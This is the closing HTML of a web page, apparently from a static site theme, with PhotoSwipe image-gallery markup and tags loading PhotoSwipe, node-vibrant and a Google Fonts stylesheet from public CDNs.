<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
